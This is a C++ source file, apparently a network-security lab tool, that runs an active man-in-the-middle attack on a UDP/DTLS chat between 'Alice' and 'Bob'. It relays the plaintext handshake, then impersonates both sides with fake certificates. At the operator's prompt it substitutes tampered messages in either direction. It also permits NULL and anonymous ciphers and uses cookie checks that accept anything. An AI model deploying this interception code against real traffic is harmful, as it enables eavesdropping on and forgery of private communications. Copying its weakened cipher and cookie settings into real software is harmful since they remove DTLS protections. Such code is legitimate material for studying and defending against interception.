#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include <poll.h>

#define MAX 1024
#define CLIENT 1
#define SERVER 2
#define PORT 12350

using namespace std;

// Initialize list of cipher suites
const char *str = "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384";

SSL_CTX *create_server_context()
{
    const SSL_METHOD *method;
    SSL_CTX *ctx;
    method = DTLSv1_2_server_method();

    ctx = SSL_CTX_new(method);
    if (!ctx)
    {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

SSL_CTX *create_client_context()
{
    const SSL_METHOD *method;
    SSL_CTX *ctx;
    method = DTLSv1_2_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx)
    {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    SSL_CTX_set_cipher_list(ctx, "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256");
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_CLIENT);
    return ctx;
}

void configure_context(SSL_CTX *ctx, string cert, string key)
{

    if (SSL_CTX_use_certificate_file(ctx, cert.c_str(), SSL_FILETYPE_PEM) <= 0)
    {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, key.c_str(), SSL_FILETYPE_PEM) <= 0)
    {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
}

void clearBuffers(char* sendMessageAlice, char* receiveMessageAlice, char* receiveMessageBob, char* sendMessageBob) {
    // Fill each buffer with zeros
    memset(sendMessageAlice, 0, MAX);
    memset(receiveMessageAlice, 0, MAX);
    memset(receiveMessageBob, 0, MAX);
    memset(sendMessageBob, 0, MAX);
}

int generate_cookie(SSL *ssl, unsigned char *cookie, unsigned int *cookie_len)
{
    // Generate a random cookie
    memcpy(cookie, "cookie", 6);
    *cookie_len = 6; // Set the cookie length
    return 1;        // Success
}

int verify_cookie(SSL *ssl, const unsigned char *cookie, unsigned int cookie_len)
{
    // Return 1 if the cookie is valid, 0 otherwise
    return 1; // Valid cookie
}

void configureCertificates(SSL_CTX *ctx, char *CertFile, char *KeyFile)
{
    if (SSL_CTX_use_certificate_file(ctx, CertFile, SSL_FILETYPE_PEM) <= 0)
    {
        cout << "\nCertificate file not valid" << endl;
        ERR_print_errors_fp(stderr);
        abort();
    }
    if (SSL_CTX_use_PrivateKey_file(ctx, KeyFile, SSL_FILETYPE_PEM) <= 0)
    {
        cout << "\nKey file not valid" << endl;
        ERR_print_errors_fp(stderr);
        abort();
    }
    if (!SSL_CTX_check_private_key(ctx))
    {
        cout << "\nKey not match with certificate file" << endl;
        abort();
    }
}

int verify_the_certificate(SSL *ssl)
{
    int result;
    X509 *cert = SSL_get_peer_certificate(ssl);
    if (cert == nullptr)
    {
        ERR_print_errors_fp(stderr);
        cout << "\nCertificate Not Given by Peer" << endl;
        abort();
    }
    int err = SSL_get_verify_result(ssl);
    if (err != X509_V_OK)
    {
        ERR_print_errors_fp(stderr);
        const char *err_string = X509_verify_cert_error_string(err);
        printf("\nCertificate Not Valid : %s\n", err_string);
        abort();
    }
    result = err;
    return result;
}

// Fake Server function for UDP
int create_fake_server_socket()
{
    int server_sd;
    struct sockaddr_in addr;
    server_sd = socket(AF_INET, SOCK_DGRAM, 0);
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(server_sd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
    {
        cout << "\nBind port error" << endl;
        close(server_sd);
        exit(1);
    }
    cout << "......Fake Server initialized......" << endl;
    return server_sd;
}

// Fake Client function for UDP
int create_fake_client_socket(const char *hostname)
{
    int client_sd;
    struct sockaddr_in addr;
    if ((client_sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
    {
        perror("Socket creation error");
        exit(1);
    }
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    return client_sd;
}

int active_mitm_attack(int server_sd, int client_sd, const char *hostname)
{
    char sendMessageAlice[MAX]; // client
    char receiveMessageAlice[MAX];
    char receiveMessageBob[MAX]; // server
    char sendMessageBob[MAX];

    struct sockaddr_in client_addr, server_addr;
    socklen_t len = sizeof(client_addr);
    struct hostent *host;

    X509 *cert;
    X509 *peer_cert;

    SSL_CTX *ctx_client;
    SSL_CTX *ctx_server;

    SSL *ssl_client;
    SSL *ssl_server;

    int client_ver = 0;
    int server_ver = 0;
    int start_tls_flag = 0;
    int start_comm_flag = 0;
    int chat_ok_reply =0;
    int chat_SSL_START=0;
        
    string s;

    struct timeval tv,tv1;
    tv.tv_sec = 5; // Timeout in seconds
    tv.tv_usec = 0;

    tv1.tv_sec = 10; // Timeout in seconds
    tv1.tv_usec = 0;

    if ((host = gethostbyname(hostname)) == NULL)
    {
        perror(hostname);
        abort();
    }

        // Set socket options to receive with timeout
    if (setsockopt(server_sd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
        perror("Error setting socket timeout");
        close(server_sd);
        abort();
    }

    // Set socket options to allow address reuse
    int opt = 1;
    if (setsockopt(server_sd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1) {
        perror("Setsockopt failed");
        close(server_sd);
        exit(EXIT_FAILURE);
    }

    // Set socket options to receive with timeout
    if (setsockopt(client_sd, SOL_SOCKET, SO_RCVTIMEO, &tv1, sizeof(tv1)) < 0) {
        perror("Error setting socket timeout");
        close(client_sd);
        abort();
    }

    bzero(&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = *(long *)(host->h_addr);

    connect(client_sd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr_in));
    while(1){

    clearBuffers(sendMessageAlice, receiveMessageAlice, receiveMessageBob, sendMessageBob);    
    int bytes_received = recvfrom(server_sd, receiveMessageAlice, MAX, 0, (struct sockaddr *)&client_addr, &len); // receive from alice
    if (bytes_received < 0) {
        string message(receiveMessageAlice);
        // cout<<message<<endl;
        if(message == "chat_close")
        {
            cout<<"Connection Terminated by Client: Bye"<<endl;
            sendto(client_sd, "chat_close\0", strlen("chat_close\0") + 1, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)); // send to bob 
            memset(&client_addr, 0, sizeof(client_addr));
            continue;// continue;
        }

        string clientIP = inet_ntoa(client_addr.sin_addr);
        if ((errno == EWOULDBLOCK || errno == EAGAIN )&& (clientIP != "0.0.0.0")) {
            // Timeout occurred, handle accordingly
            cout<<inet_ntoa(client_addr.sin_addr)<<endl;
            cout << "Timeout: No message received from client, Packet might be lost\n";
            memset(&client_addr, 0, sizeof(client_addr));
            continue; // Optionally continue waiting for messages or handle the timeout
        } else {
            continue;
        }
    }
    cout << "Alice: " << receiveMessageAlice << endl;

    strcpy(sendMessageBob, receiveMessageAlice);
    sendto(client_sd, sendMessageBob, strlen(sendMessageBob) + 1, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)); // send to bob
    if ((strncmp(receiveMessageAlice, "chat_close", 10)) == 0)
    {
        cout << "\nConnection terminated by client: Bye" << endl;
        memset(&client_addr, 0, sizeof(client_addr));
        continue;
    }

    if(string(receiveMessageAlice) == "chat_hello")
    {
        start_comm_flag=1;
    }

    int receivedBob = recvfrom(client_sd, receiveMessageBob, MAX, 0, (struct sockaddr *)&server_addr, (socklen_t *)sizeof(server_addr)); // receive from bob
    if (receivedBob < 0) {
        if ((errno == EWOULDBLOCK || errno == EAGAIN )) {
            // Timeout occurred, handle accordingly
            cout<<endl;
            cout<< "Timeout: No message received from server, Packet might be lost\n";
            cout<<"Terminating the connection"<<endl;
            cout<<endl;
            sendto(server_sd, "chat_close\0", strlen("chat_close\0") + 1, 0, (struct sockaddr *)&client_addr, sizeof(client_addr));
            memset(&client_addr, 0, sizeof(client_addr));
            continue;
        }
    }
    cout << "Bob: " << receiveMessageBob << endl;
    if(string(receiveMessageBob)=="chat_ok_reply") chat_ok_reply =1;
    strcpy(sendMessageAlice, receiveMessageBob);

    sendto(server_sd, sendMessageAlice, strlen(sendMessageAlice) + 1, 0, (struct sockaddr *)&client_addr, sizeof(client_addr));
    if(string(receiveMessageBob) == "chat_close")
    {
        cout<<"Server: chat_close"<<endl;
        cout<<endl;
        cout<<"Connection Terminated by Server"<<endl; 
        // sendto(server_sd, "chat_close\0", strlen("chat_close\0") + 1, 0, (struct sockaddr *)&client_addr, sizeof(client_addr));
        memset(&client_addr, 0, sizeof(client_addr));
        continue;
    }

    bytes_received = recvfrom(server_sd, receiveMessageAlice, MAX, 0, (struct sockaddr *)&client_addr, &len); // receive from alice
    if (bytes_received < 0) {
        if ((errno == EWOULDBLOCK || errno == EAGAIN )) {
            // Timeout occurred, handle accordingly
            cout<<endl;
            string s = "chat_close";
            cout<<"You: chat_close"<<endl;
            cout<<endl;

            cout << "Timeout: No message received from client, Packet might be lost\n";
            cout<<"Terminating the connection"<<endl;
            cout<<endl;

            s += '\0';

            // sendto(client_sd, s.c_str(), s.length()+1, 0, (struct sockaddr *)&server_addr);
            sendto(client_sd, "chat_close\0", strlen("chat_close\0") + 1, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)); // send to bob
            memset(&client_addr, 0, sizeof(client_addr));
            // sleep(20);
            continue;
        } else {
            perror("Error receiving message");
            close(server_sd);
            abort();
        }
    }
    
    if(string(receiveMessageAlice)=="chat_SSL_START") chat_SSL_START =1;

    cout << "Alice: " << receiveMessageAlice << endl;

    strcpy(sendMessageBob, receiveMessageAlice);

    sendto(client_sd, sendMessageBob, strlen(sendMessageBob) + 1, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)); // send to bob

    if ((strncmp(receiveMessageAlice, "chat_close", 10)) == 0)
    {
        cout << "\nConnection terminated" << endl;
        memset(&client_addr, 0, sizeof(client_addr));
            // sleep(20);
        continue;
    }

    receivedBob = recvfrom(client_sd, receiveMessageBob, MAX, 0, (struct sockaddr *)&server_addr, (socklen_t *)sizeof(server_addr)); // receive from bob
    cout << "Bob: " << receiveMessageBob << endl;
    if (receivedBob < 0) {
        if ((errno == EWOULDBLOCK || errno == EAGAIN )) {
            // Timeout occurred, handle accordingly
            cout<<endl;
            cout<<"You: chat_close"<<endl;
            cout<<endl;
            cout<< "Timeout: No message received from server, Packet might be lost\n";
            cout<<"Terminating the connection"<<endl;
            cout<<endl;
            sendto(server_sd, "chat_close\0", strlen("chat_close\0") + 1, 0, (struct sockaddr *)&client_addr, sizeof(client_addr));
            memset(&client_addr, 0, sizeof(client_addr));
            // sleep(20);
            continue;
        }
    }
    strcpy(sendMessageAlice, receiveMessageBob);
    sendto(server_sd, sendMessageAlice, strlen(sendMessageAlice) + 1, 0, (struct sockaddr *)&client_addr, sizeof(client_addr));

    if ((strncmp(receiveMessageBob, "chat_close", 10)) == 0)
    {
        cout << "\nConnection terminated" << endl;
        memset(&client_addr, 0, sizeof(client_addr));
        // sleep(20);
        continue;
    }

    tv1.tv_sec = 0;
    if (setsockopt(client_sd, SOL_SOCKET, SO_RCVTIMEO, &tv1, sizeof(tv1)) < 0) {
            perror("Error removing socket timeout");
            close(client_sd);
            exit(EXIT_FAILURE);
    }

    tv.tv_sec = 0;
    if (setsockopt(server_sd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
            perror("Error removing socket timeout");
            close(server_sd);
            exit(EXIT_FAILURE);
    }

    if ((strncmp(receiveMessageBob, "chat_START_SSL_ACK", 18)) == 0)
    {
        SSL_library_init();
        ctx_server = create_server_context();
        SSL_CTX_set_security_level(ctx_server, 1);
        SSL_CTX_set_cipher_list(ctx_server, "ALL:NULL:eNULL:aNULL");
        SSL_CTX_set_session_cache_mode(ctx_server, SSL_SESS_CACHE_SERVER);
        SSL_CTX_set_session_id_context(ctx_server, (const unsigned char *)"DTLS", strlen("DTLS"));
        configure_context(ctx_server, "/root/fake_certificates/fake_bob.pem", "/root/fake_certificates/fake_bob_private_key.pem"); // put server certificates file names
        SSL_CTX_load_verify_locations(ctx_server, "/root/fake_certificates/chainOfTrust.pem", NULL);
        SSL_CTX_set_verify(ctx_server, SSL_VERIFY_PEER, NULL);
        SSL_CTX_set_mode(ctx_server, SSL_MODE_AUTO_RETRY);
        SSL_CTX_set_cookie_generate_cb(ctx_server, generate_cookie);
        SSL_CTX_set_cookie_verify_cb(ctx_server, verify_cookie);

        // Set client address for SSL connection
        BIO *bio = BIO_new_dgram(server_sd, BIO_CLOSE);
        ssl_server = SSL_new(ctx_server);
        struct timeval timeout;
        timeout.tv_sec = 5;
        timeout.tv_usec = 0;
        BIO_ctrl(bio, BIO_CTRL_DGRAM_SET_RECV_TIMEOUT, 0, &timeout);

        // Create SSL structure
        if (!ssl_server)
        {

            ERR_print_errors_fp(stderr);
            close(server_sd);
            SSL_CTX_free(ctx_server);
            exit(EXIT_FAILURE);
        }

        SSL_set_bio(ssl_server, bio, bio);
        // Perform DTLS handshake
        if (DTLSv1_listen(ssl_server, (BIO_ADDR *)&client_addr) <= 0)
        {
            cout<<"Handshake Message might be lost"<<endl;
            ERR_print_errors_fp(stderr);
            SSL_shutdown(ssl_server);
            // close(server_sd);
            SSL_CTX_free(ctx_server);
            memset(&client_addr, 0, sizeof(client_addr));
            continue;
            // exit(EXIT_FAILURE);
        }

        else
        {
            cout << "SSL/TLS pipe successful" << endl;
            if (SSL_accept(ssl_server) <= 0)
            {
                cout << "Failed to accept incoming DTLS connection" << endl;
                ERR_print_errors_fp(stderr);
                SSL_shutdown(ssl_server);
                close(server_sd);
                SSL_CTX_free(ctx_server);
                exit(EXIT_FAILURE);
            }

            peer_cert = SSL_get_peer_certificate(ssl_server);
            if (peer_cert != nullptr)
            {
                cout << endl;
                X509_NAME_print_ex_fp(stdout, X509_get_subject_name(peer_cert), 0, XN_FLAG_ONELINE);
            }
            else
            {
                ERR_print_errors_fp(stderr);
                SSL_free(ssl_server);
                SSL_CTX_free(ctx_server);
                abort();
            }
            int result = verify_the_certificate(ssl_server);
            if (result == X509_V_OK)
            {
                cout << "Alice Certificate Valid" << endl;
                server_ver = 1;
            }
        }

        // client side of ssl
        SSL_library_init();
        OpenSSL_add_ssl_algorithms();
        SSL_load_error_strings();

        ctx_client = create_client_context();
        SSL_CTX_set_security_level(ctx_client, 1);

        if (SSL_CTX_use_certificate_file(ctx_client, "/root/fake_certificates/fake_alice.pem", SSL_FILETYPE_PEM) <= 0)
        {
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }

        if (SSL_CTX_use_PrivateKey_file(ctx_client, "/root/fake_certificates/fake_alice_private_key.pem", SSL_FILETYPE_PEM) <= 0)
        {
            cout << "\nKey file not valid" << endl;
            ERR_print_errors_fp(stderr);
            abort();
        }
        if (!SSL_CTX_check_private_key(ctx_client))
        {
            cout << "\nKey not match with certificate file" << endl;
            abort();
        }

        ssl_client = SSL_new(ctx_client);
        SSL_CTX_set_verify(ctx_client, SSL_VERIFY_PEER, NULL);
        SSL_CTX_load_verify_locations(ctx_client, "/root/fake_certificates/chainOfTrust.pem", NULL);
        if (ssl_client == nullptr)
        {
            ERR_print_errors_fp(stderr);
            SSL_free(ssl_client);
            SSL_CTX_free(ctx_client);
            close(client_sd);
            abort();
        }

        SSL_set_fd(ssl_client, client_sd);

        int retval = SSL_connect(ssl_client);

        if (retval <= 0)
        {

            switch (SSL_get_error(ssl_client, retval))
            {
            case SSL_ERROR_ZERO_RETURN:
                fprintf(stderr, "SSL_connect failed with SSL_ERROR_ZERO_RETURN\n");
                break;
            case SSL_ERROR_WANT_READ:
                fprintf(stderr, "SSL_connect failed with SSL_ERROR_WANT_READ\n");
                break;
            case SSL_ERROR_WANT_WRITE:
                fprintf(stderr, "SSL_connect failed with SSL_ERROR_WANT_WRITE\n");
                break;
            case SSL_ERROR_WANT_CONNECT:
                fprintf(stderr, "SSL_connect failed with SSL_ERROR_WANT_CONNECT\n");
                break;
            case SSL_ERROR_WANT_ACCEPT:
                fprintf(stderr, "SSL_connect failed with SSL_ERROR_WANT_ACCEPT\n");
                break;
            case SSL_ERROR_WANT_X509_LOOKUP:
                fprintf(stderr, "SSL_connect failed with SSL_ERROR_WANT_X509_LOOKUP\n");
                break;
            case SSL_ERROR_SYSCALL:
                fprintf(stderr, "SSL_connect failed with SSL_ERROR_SYSCALL\n");
                break;
            case SSL_ERROR_SSL:
                fprintf(stderr, "SSL_connect failed with SSL_ERROR_SSL\n");
                break;
            default:
                fprintf(stderr, "SSL_connect failed with unknown error\n");
                break;
            }
            ERR_print_errors_fp(stderr);
            abort();
        }
        else
        {
            int result = verify_the_certificate(ssl_client);
            if (result == X509_V_OK)
            {
                cout << "Bob Certificate Valid" << endl;
                client_ver = 1;
            }
        }
    }

    if ((server_ver == 1) && (client_ver == 1))
    {
        start_tls_flag = 1;
    }

    if ((start_tls_flag == 1) && (start_comm_flag == 1)) // if tls established
    {
        struct pollfd fds[2]; // Two file descriptors for bidirectional communication
        fds[0].fd = client_sd; // Client's socket for receiving
        fds[0].events = POLLIN;
        fds[1].fd = server_sd; 
        fds[1].events = POLLIN;
        cout<<endl;
        while (true)
        {  

            if (poll(fds, 2, -1) > 0) {

                clearBuffers(sendMessageAlice, receiveMessageAlice, receiveMessageBob, sendMessageBob);    

                if (fds[1].revents & POLLIN) {
                    
                        SSL_read(ssl_server, receiveMessageAlice, MAX);
                        // for tampering
                        int i = 0, n;
                        string tamper;
                        cout << "Client: " << receiveMessageAlice << endl;
                        
                        if ((strncmp(receiveMessageAlice, "chat_close", 10)) == 0)
                        {
                            strcpy(sendMessageBob, receiveMessageAlice);
                            SSL_write(ssl_client, sendMessageBob, strlen(sendMessageBob) + 1);
                            cout << "\nConnection terminated"<< endl;
                            break;
                        }

                        cout << "Do you want to play with intigrity (Y/n): " << endl;
                        getline(cin,tamper);
                        if (tamper == "Y")
                        {
                            cout << "Enter tampered data to send to Server: " << endl;

                            std::getline(std::cin >> std::ws, s); // Read a line of input with leading whitespace removed
                            strcpy(sendMessageBob, s.c_str());
                        }
                        else
                        {
                            strcpy(sendMessageBob, receiveMessageAlice);
                        }
                        cout<<endl;

                        SSL_write(ssl_client, sendMessageBob, strlen(sendMessageBob) + 1);
                    }

                    if (fds[0].revents & POLLIN) {
                        string tamper;

                        // receive from ssl_client and send to ssl_server

                        SSL_read(ssl_client, receiveMessageBob, MAX);

                        cout << "Server: " << receiveMessageBob << endl;

                        if ((strncmp(receiveMessageBob, "chat_close", 10)) == 0)
                        {
                            strcpy(sendMessageAlice, receiveMessageBob);
                            SSL_write(ssl_client, sendMessageAlice, strlen(sendMessageAlice) + 1);
                            cout << "\nConnection terminated"<< endl;
                            break;
                        }

                        cout << "Do you want to play with intigrity (Y/n): " << endl;
                        getline(cin,tamper);
                        s = '\0';
                        if (tamper == "Y")
                        {
                            cout << "Enter tampered data to send to Client: " << endl;
                            std::getline(std::cin >> std::ws, s); // Read a line of input with leading whitespace removed
                            strcpy(sendMessageAlice, s.c_str());
                        }
                        else
                        {
                            strcpy(sendMessageAlice, receiveMessageBob);
                        }
                        cout<<endl;
                        SSL_write(ssl_server, sendMessageAlice, strlen(sendMessageAlice) + 1);
                    }
                
            }

        }
    }
    else if ((start_tls_flag == 0) && (start_comm_flag == 1))
    { // communicate on socket

        struct pollfd fds[2]; // Two file descriptors for bidirectional communication
        fds[0].fd = client_sd; // Client's socket for receiving
        fds[0].events = POLLIN;
        fds[1].fd = server_sd; 
        fds[1].events = POLLIN;
        cout<<endl;

        while (true)
        {

            if (poll(fds, 2, -1) > 0) {

                clearBuffers(sendMessageAlice, receiveMessageAlice, receiveMessageBob, sendMessageBob);    

                if (fds[1].revents & POLLIN) {
                    
                    recvfrom(server_sd, receiveMessageAlice, MAX, 0, (struct sockaddr *)&client_addr, (socklen_t *)sizeof(client_addr));
                    if ((strncmp(receiveMessageAlice, "chat_close", 10)) == 0)
                    {
                        cout << "\nConnection terminated from Client" << endl;
                        break;
                    }
                    cout << "\nFrom Client on socket: " << receiveMessageAlice << endl;

                    strcpy(sendMessageBob, receiveMessageAlice);

                    sendto(client_sd, sendMessageBob, strlen(sendMessageBob) + 1, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));

                    if ((strncmp(sendMessageBob, "chat_close", 10)) == 0)
                    {
                        cout << "\nConnection terminated" << endl;
                        break;
                    }

                }

                if (fds[0].revents & POLLIN) {

                    // receive from ssl_client and send to ssl_server
                    recvfrom(client_sd, receiveMessageBob, MAX, 0, (struct sockaddr *)&server_addr, (socklen_t *)sizeof(server_addr));

                    if ((strncmp(receiveMessageBob, "chat_close", 10)) == 0)
                    {
                        cout << "\nConnection terminated from Client" << endl;
                        break;
                    }
                    cout << " \nFrom Server on TLS: " << receiveMessageBob << endl;
                    strcpy(sendMessageAlice, receiveMessageBob);
                    sendto(server_sd, sendMessageAlice, strlen(sendMessageAlice) + 1, 0, (struct sockaddr *)&client_addr, sizeof(client_addr));

                    if ((strncmp(sendMessageAlice, "chat_close", 10)) == 0)
                    {
                        cout << "\nConnection terminated" << endl;
                        break;
                    }

                }
                
            }

        }
    }
    }
    close(server_sd);
    close(client_sd);
    return 0;
}

int main(int argc, char *argv[])
{
    char *host_name_client, *port_no, *option;
    char *host_name_server;
    int client_sd;
    int connection;
    if (argc != 4)
    {
        cout << "No of arguments wrong: " << endl;
        cout << argc << endl;
        exit(0);
    }
    option = argv[1];
    host_name_client = argv[2];
    host_name_server = argv[3];
    connection = create_fake_server_socket();                // for fake Bob
    client_sd = create_fake_client_socket(host_name_server); // for fake Alice
    if (strcmp(option, "-m") == 0)
    {
        active_mitm_attack(connection, client_sd, host_name_server);
    }
    else
    {
        cout << "Wrong option\n"
             << endl;
    }
    return 0;
}
